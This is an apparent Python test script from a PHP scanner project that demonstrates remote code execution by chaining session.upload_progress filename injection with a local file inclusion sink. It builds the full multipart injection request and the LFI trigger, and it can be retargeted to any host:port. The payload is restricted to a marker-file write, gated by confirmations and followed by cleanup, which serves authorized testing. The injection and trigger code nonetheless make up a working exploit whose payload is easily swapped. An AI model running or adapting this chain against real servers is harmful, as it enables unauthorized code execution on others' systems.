#!/usr/bin/env python3
"""Contained RCE demonstration — AUTHORIZED TESTING ONLY.

Chain: public Chain-A primitive (ikow/php2shell-poc chain_a_session_lfi.py):
PHP stores the raw multipart filename into the session file via
session.upload_progress; an LFI sink (vuln.php?page=) includes the session
file; injected `<?php` executes. No memory corruption, no OOM, deterministic.

SAFETY CONTRACT (read before running):
  - DEFAULT targets are the lab twins only (127.0.0.1:19110/:19111).
  - `--target host:port` retargets to YOUR authorized box, but requires TWO
    confirmations: (1) type the exact target back at the prompt (guards
    paste/cron accidents), AND (2) env var P2S_RCE_ARM=1 must be set (guards
    history-replay and scripts). Refusal otherwise. No confirmation needed
    for the default lab twins.
  - `--lfi-path` / `--session-path` adapt to your app's sink layout
    (defaults match the lab's vuln.php + /tmp sessions).
  - Payload is FIXED to a marker write: `file_put_contents('/tmp/p2s-demo-<tok>',
    'pwned-<tok>')` + `echo` of the same token. No shell command execution,
    no `system()`/`exec()`/backticks, no reading files, no persistence, no
    second stage. Verification reads the marker back through the SAME LFI
    channel (proving code ran) and then DELETES it.
  - Remote verification (HTTP echo) is the ONLY proof off-lab: docker exec
    ground truth exists for lab twins only. Echo-only positives are reported
    as such — see the echo-lies note in RESEARCH.
  - Scanner package isolation: NOT imported by php2shell_scanner or the
    default test suite. TestRceDemo opt-in only (P2S_RCEDEMO=1 / --rcedemo).

Usage:
    python3 tests/lab/rce_demo.py                                  # lab twins
    P2S_RCE_ARM=1 python3 tests/lab/rce_demo.py --target 10.0.0.5:8080 \\
        --lfi-path /vuln.php --session-path /var/lib/php/sessions
Exit 0: targets behaved as reported (see per-target lines). Exit 1: unexpected
behavior OR confirmation refused. Exit 2: usage error.
"""
import argparse
import os
import socket
import sys
import uuid

LAB_TARGETS = (("127.0.0.1", 19110, "vuln-8.5.11"), ("127.0.0.1", 19111, "patched-8.5.12"))
TIMEOUT = 20


def send_raw(host: int | str, port: int, req: bytes) -> bytes:
    s = socket.create_connection((host, port), timeout=TIMEOUT)
    s.settimeout(TIMEOUT)
    s.sendall(req)
    raw = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            raw += c
            if len(raw) > 1_000_000:
                break
    except (socket.timeout, TimeoutError, ConnectionResetError):
        pass
    s.close()
    return raw


def inject(host: str, port: int, sid: str, marker: str, inject_path: str = "/index.php") -> None:
    # FIXED payload shape: file_put_contents marker write only. The filename
    # carries the PHP; the asserts pin the exact allowed shape so this
    # function cannot be repurposed for shell commands without editing source.
    php = f"<?php file_put_contents('/tmp/{marker}','pwned-{marker}');echo 'M-{marker}';?>"
    assert php.startswith("<?php file_put_contents('/tmp/p2s-demo-"), "payload guard"
    assert "system" not in php and "exec" not in php and "`" not in php, "payload guard"
    assert inject_path.startswith("/") and "?" not in inject_path, "path guard"
    boundary = "AAABBBCCC"
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="' + php.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    req = (f"POST {inject_path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
           f"Content-Length: {len(body)}\r\nCookie: PHPSESSID={sid}\r\n"
           f"Connection: close\r\n\r\n").encode() + body
    send_raw(host, port, req)


def trigger(host: str, port: int, sid: str, sessfile: str, lfi_path: str = "/vuln.php") -> bytes:
    assert lfi_path.startswith("/") and "?" not in lfi_path, "path guard"
    req = (f"GET {lfi_path}?page={sessfile} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    return send_raw(host, port, req)


def docker_marker_present(port: int, marker: str) -> bool:
    import subprocess
    cname = {19110: "lab-rce-vuln-1", 19111: "lab-rce-fixed-1"}[port]
    r = subprocess.run(["docker", "exec", cname, "ls", f"/tmp/{marker}"],
                       capture_output=True, text=True, timeout=15)
    return r.returncode == 0


def cleanup_lab(port: int, marker: str) -> None:
    assert marker.startswith("p2s-demo-"), "cleanup guard"
    cname = {19110: "lab-rce-vuln-1", 19111: "lab-rce-fixed-1"}[port]
    import subprocess
    subprocess.run(["docker", "exec", cname, "rm", "-f", f"/tmp/{marker}"],
                   capture_output=True, timeout=15)


def verify_remote(host: str, port: int, sid: str, sessfile: str, marker: str,
                  lfi_path: str = "/vuln.php") -> tuple[bool, bool]:
    """Off-lab proof: re-trigger and look for the marker ECHO in HTTP.
    Returns (echoed, ran). `ran` is True only if the FULL marker content
    (pwned-<tok>) appears — echo of M-<tok> alone is insufficient (echo-lies
    case: serialized row printed without <?php parsing). No docker access."""
    raw = trigger(host, port, sid, sessfile, lfi_path)
    text = raw.decode("latin-1", "replace")
    return (f"M-{marker}" in text, f"pwned-{marker}" in text)


def cleanup_remote(host: str, port: int, sid: str, marker: str,
                   inject_path: str = "/index.php", lfi_path: str = "/vuln.php",
                   session_path: str = "/tmp") -> bool:
    """Off-lab cleanup: inject an @unlink(marker) payload through the same
    channel, trigger, then confirm the echo is gone. Returns True if gone."""
    assert marker.startswith("p2s-demo-"), "cleanup guard"
    php = f"<?php @unlink('/tmp/{marker}');echo 'cleaned-{marker}';?>"
    assert "system" not in php and "exec" not in php and "`" not in php, "payload guard"
    boundary = "ZZZYYYXXX"
    sid2 = "p2sclean" + uuid.uuid4().hex[:16]
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid2.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="' + php.encode("latin-1") + b'"\r\n\r\n'
        b"Z\r\n"
        b"--" + boundary.encode() + b"--\r\n"
    )
    req = (f"POST {inject_path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
           f"Content-Length: {len(body)}\r\nCookie: PHPSESSID={sid2}\r\n"
           f"Connection: close\r\n\r\n").encode() + body
    send_raw(host, port, req)
    _ = trigger(host, port, sid2, f"{session_path}/sess_{sid2}", lfi_path)
    echoed, ran = verify_remote(host, port, sid, sessfile, marker, lfi_path)
    return not ran


def demo_one(host: str, port: int, label: str, lab: bool,
             inject_path: str = "/index.php", lfi_path: str = "/vuln.php",
             session_path: str = "/tmp") -> bool:
    sid = "p2sdemo" + uuid.uuid4().hex[:16]
    marker = "p2s-demo-" + uuid.uuid4().hex[:12]
    sessfile = f"{session_path}/sess_{sid}"
    print(f"[{label} {host}:{port}] injecting marker {marker} (sid {sid[:14]}…)")
    inject(host, port, sid, marker, inject_path)
    if lab:
        raw = trigger(host, port, sid, sessfile, lfi_path)
        text = raw.decode("latin-1", "replace")
        echoed = f"M-{marker}" in text and f"pwned-{marker}" in text
        present = docker_marker_present(port, marker)
        ok = present
        print(f"  trigger -> {'RCE-POSITIVE' if ok else 'negative'} "
              f"(marker file in container: {present}, echo-only: {echoed})")
        cleanup_lab(port, marker)
        gone = not docker_marker_present(port, marker)
    else:
        echoed, ran = verify_remote(host, port, sid, sessfile, marker, lfi_path)
        ok = echoed and ran
        print(f"  trigger -> {'RCE-POSITIVE' if ok else 'negative'} "
              f"(echo-only; remote proof, see echo-lies caveat)")
        gone = cleanup_remote(host, port, sid, marker, inject_path, lfi_path, session_path)
    print(f"  cleanup -> {'marker removed' if gone else 'MARKER STILL PRESENT (investigate)'}")
    return ok and gone


def parse_target(spec: str) -> tuple[str, int]:
    s = spec.strip()
    s = s.split("://", 1)[-1].split("/")[0]
    if ":" in s:
        h, p = s.rsplit(":", 1)
        return h.strip("[]"), int(p)
    return s, 80


def confirm_retarget(host: str, port: int) -> bool:
    # Confirmation 1/2: environment arm (guards history-replay and scripts).
    if os.environ.get("P2S_RCE_ARM") != "1":
        print("REFUSED: --target given without P2S_RCE_ARM=1 in the environment.")
        print("Rerun with P2S_RCE_ARM=1 to confirm you intend exploitation traffic.")
        return False
    # Confirmation 2/2: typed echo (guards paste/cron accidents). Must be a TTY;
    # piped stdin can never confirm (scripts must not drive this).
    if not sys.stdin.isatty():
        print("REFUSED: --target confirmation needs an interactive terminal "
              "(stdin is not a TTY). Retargeting from scripts is not supported.")
        return False
    print(f"You are about to send EXPLOITATION TRAFFIC (Chain-A marker write + "
          f"cleanup) to {host}:{port}.")
    print("This must be a system you own or are explicitly authorized to test.")
    try:
        answer = input(f"Type the target EXACTLY ({host}:{port}) to proceed: ").strip()
    except (EOFError, KeyboardInterrupt):
        print("\nAborted.")
        return False
    if answer != f"{host}:{port}":
        print(f"REFUSED: typed {answer!r} != {host}:{port}. Aborted.")
        return False
    return True


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Contained RCE demo (Chain-A marker write). Lab twins by default; "
                    "--target retargets with double confirmation (typed echo + P2S_RCE_ARM=1).")
    ap.add_argument("--target", default="",
                    help="authorized host:port (default: lab twins 127.0.0.1:19110+:19111)")
    ap.add_argument("--lfi-path", default="/vuln.php", help="LFI sink path (default /vuln.php)")
    ap.add_argument("--inject-path", default="/index.php", help="upload-progress injection path")
    ap.add_argument("--session-path", default="/tmp", help="session save dir for sess_ file")
    args = ap.parse_args(argv)
    if not args.target:
        print("CONTAINED RCE DEMO — lab twins only, marker-write payload, cleanup enforced")
        results = {}
        for host, port, label in sorted(LAB_TARGETS, key=lambda t: t[1]):
            try:
                results[label] = demo_one(host, port, label, True)
            except Exception as e:
                print(f"  ERROR {type(e).__name__}: {e}")
                results[label] = False
        print("\n--- verdict ---")
        for label, ok in results.items():
            print(f"  {label}: {'RCE-positive (expected — app-layer sink, patch does not cover)' if ok else 'UNEXPECTED (see above)'}")
        if all(results.values()):
            print("Both twins RCE-positive as documented: code executed, markers cleaned, "
                  "nothing outside /tmp touched. Safe-under-authorization complete.")
            return 0
        return 1
    host, port = parse_target(args.target)
    if not confirm_retarget(host, port):
        return 1
    label = f"authorized-{host}:{port}"
    try:
        ok = demo_one(host, port, label, False, args.inject_path, args.lfi_path, args.session_path)
    except Exception as e:
        print(f"  ERROR {type(e).__name__}: {e}")
        return 1
    print("\n--- verdict ---")
    print(f"  {label}: {'RCE-POSITIVE (echo proof; verify + cleanup reported above)' if ok else 'negative/unexpected (see above)'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
